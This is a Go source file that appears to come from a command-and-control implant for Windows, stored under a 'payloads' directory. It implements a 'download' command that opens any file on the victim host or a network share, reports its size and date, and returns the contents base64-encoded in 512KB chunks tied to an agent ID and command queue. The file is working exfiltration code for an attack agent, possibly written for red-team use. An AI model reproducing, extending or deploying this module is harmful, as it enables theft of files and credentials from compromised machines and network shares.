// server/docker/payloads/Windows/action_download.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type DownloadCommand struct{}

func (c *DownloadCommand) Name() string {
	return "download"
}

// Modified Execute function from action_download.go
func (c *DownloadCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// With the improved parsing, we should receive exactly one argument (the full path)
	// But let's still handle the case where it might have been split
	if len(args) == 0 {
		return CommandResult{
			Error:       fmt.Errorf("usage: download <filename>"),
			ErrorString: "usage: download <filename>",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Join all args back together in case they were incorrectly split
	// With the new parsing, this should usually just be args[0]
	targetPath := strings.Join(args, " ")

	// Remove any surrounding quotes if present (should already be done by parser)
	targetPath = strings.Trim(targetPath, "\"'")

	fmt.Printf("[DEBUG] Download command received path: %s\n", targetPath)

	// Handle path resolution for both local and UNC paths
	if !filepath.IsAbs(targetPath) {
		// Get the current working directory
		workingDir := ctx.WorkingDir

		// Special handling for UNC paths
		if strings.HasPrefix(workingDir, "\\\\") || strings.HasPrefix(workingDir, "//") {
			// For UNC paths, normalize to backslashes
			workingDir = strings.ReplaceAll(workingDir, "/", "\\")

			// Ensure proper path joining for UNC
			if !strings.HasSuffix(workingDir, "\\") {
				workingDir += "\\"
			}
			targetPath = workingDir + targetPath
		} else {
			// For local paths, use filepath.Join
			targetPath = filepath.Join(workingDir, targetPath)
		}
	}

	// Clean the path but preserve UNC format
	if strings.HasPrefix(targetPath, "\\\\") || strings.HasPrefix(targetPath, "//") {
		// Normalize to backslashes for UNC
		targetPath = strings.ReplaceAll(targetPath, "/", "\\")

		// Manual cleaning for UNC paths to preserve the double backslash
		parts := strings.Split(targetPath, "\\")
		var cleanParts []string
		for _, part := range parts {
			if part != "" && part != "." {
				cleanParts = append(cleanParts, part)
			}
		}
		// Reconstruct with double backslash prefix for UNC
		if len(cleanParts) > 2 {
			targetPath = "\\\\" + strings.Join(cleanParts, "\\")
		}
	} else {
		// For non-UNC paths, use standard cleaning
		targetPath = filepath.Clean(targetPath)
	}

	// Display path for user feedback
	displayPath := targetPath
	if runtime.GOOS == "windows" {
		displayPath = strings.ReplaceAll(targetPath, "/", "\\")
	}

	fmt.Printf("[DEBUG] Attempting to open file: %s\n", targetPath)

	// Use NetworkAwareOpenFile to support network shares
	// This handles network authentication properly
	file, err := NetworkAwareOpenFile(targetPath, os.O_RDONLY, 0)

	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Error opening file '%s': %v", displayPath, err),
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer file.Close()

	// Get file information
	fileInfo, err := file.Stat()
	if err != nil {
		return CommandResult{
			Output:      fmt.Sprintf("Error getting file info for '%s': %v", displayPath, err),
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Check if it's a directory
	if fileInfo.IsDir() {
		err := fmt.Errorf("'%s' is a directory, not a file", displayPath)
		return CommandResult{
			Output:      err.Error(),
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Generate context info
	contextInfo := fmt.Sprintf("[*] File: %s\n[*] Size: %d bytes\n[*] Modified: %s",
		displayPath,
		fileInfo.Size(),
		fileInfo.ModTime().Format("2006-01-02 15:04:05"))

	// Read first chunk
	const chunkSize = 512 * 1024 // 512KB chunks
	chunk := make([]byte, chunkSize)
	n, err := file.Read(chunk)
	if err != nil && err != io.EOF {
		return CommandResult{
			Output:      fmt.Sprintf("Error reading file '%s': %v", displayPath, err),
			Error:       err,
			ErrorString: err.Error(),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// For tracking purposes, use the base filename
	baseFilename := filepath.Base(targetPath)
	trackedFilename := baseFilename

	// Special case: single small file
	if n < chunkSize && err == io.EOF {
		encodedData := base64.StdEncoding.EncodeToString(chunk[:n])
		return CommandResult{
			Output:      contextInfo + fmt.Sprintf("\n[+] Downloaded %s (complete in single chunk)", baseFilename),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
			Command: Command{
				Command:      fmt.Sprintf("download %s", baseFilename),
				Filename:     trackedFilename,
				CurrentChunk: 1,
				TotalChunks:  1,
				Data:         encodedData,
			},
		}
	}

	// Calculate total chunks properly
	totalChunks := (fileInfo.Size() + chunkSize - 1) / chunkSize
	if totalChunks == 0 {
		totalChunks = 1
	}

	encodedData := base64.StdEncoding.EncodeToString(chunk[:n])

	// Register the new download with the command queue
	commandQueue.AddOrUpdateDownload(trackedFilename, targetPath, int(totalChunks))
	commandQueue.UpdateDownloadProgress(trackedFilename, 1)

	result := CommandResult{
		Output:      contextInfo + fmt.Sprintf("\n[*] Downloading %s - Chunk 1/%d", baseFilename, totalChunks),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
		Command: Command{
			Command:      fmt.Sprintf("download %s", baseFilename),
			Filename:     trackedFilename,
			CurrentChunk: 1,
			TotalChunks:  int(totalChunks),
			Data:         encodedData,
		},
	}

	fmt.Printf("[DEBUG Download] Created result with:\n")
	fmt.Printf("  Filename: %s\n", result.Command.Filename)
	fmt.Printf("  CurrentChunk: %d\n", result.Command.CurrentChunk)
	fmt.Printf("  TotalChunks: %d\n", result.Command.TotalChunks)
	fmt.Printf("  Data length: %d bytes (base64)\n", len(result.Command.Data))

	return result
}

// Note: NetworkAwareOpenFile is already defined in netonly_file_support.go for Windows
// and has a stub implementation in network_aware_stub.go for non-Windows systems.
// It handles network authentication automatically when accessing network shares.

// GetNextFileChunk continues downloading a file from a specific chunk
func GetNextFileChunk(filePath string, chunkNumber int, originalCmd Command) (*CommandResult, error) {
	fmt.Printf("[DEBUG GetNextFileChunk] Request for chunk %d of file %s (total chunks: %d)\n",
		chunkNumber, filePath, originalCmd.TotalChunks)

	// Use NetworkAwareOpenFile for network authentication support
	file, err := NetworkAwareOpenFile(filePath, os.O_RDONLY, 0)

	if err != nil {
		return nil, fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	// Get file information
	_, err = file.Stat()
	if err != nil {
		return nil, fmt.Errorf("failed to stat file: %w", err)
	}

	const chunkSize = 512 * 1024 // 512KB chunks

	// Seek to the correct position
	offset := int64(chunkNumber-1) * chunkSize
	_, err = file.Seek(offset, 0)
	if err != nil {
		return nil, fmt.Errorf("failed to seek to position %d: %w", offset, err)
	}

	// Read the chunk
	chunk := make([]byte, chunkSize)
	n, err := file.Read(chunk)
	if err != nil && err != io.EOF {
		return nil, fmt.Errorf("failed to read chunk: %w", err)
	}

	if n == 0 {
		return nil, fmt.Errorf("no data read for chunk %d", chunkNumber)
	}

	// Encode the chunk
	encodedData := base64.StdEncoding.EncodeToString(chunk[:n])

	// Create the result
	result := &CommandResult{
		Output:      fmt.Sprintf("Chunk %d/%d of %s", chunkNumber, originalCmd.TotalChunks, filepath.Base(filePath)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
		Command: Command{
			CommandID:    originalCmd.CommandID,
			CommandDBID:  originalCmd.CommandDBID,
			AgentID:      originalCmd.AgentID,
			Command:      originalCmd.Command,
			Filename:     originalCmd.Filename,
			CurrentChunk: chunkNumber,
			TotalChunks:  originalCmd.TotalChunks,
			Data:         encodedData,
			Timestamp:    originalCmd.Timestamp,
		},
	}

	fmt.Printf("[DEBUG GetNextFileChunk] Sending chunk %d with %d bytes (base64: %d bytes)\n",
		chunkNumber, n, len(encodedData))

	return result, nil
}
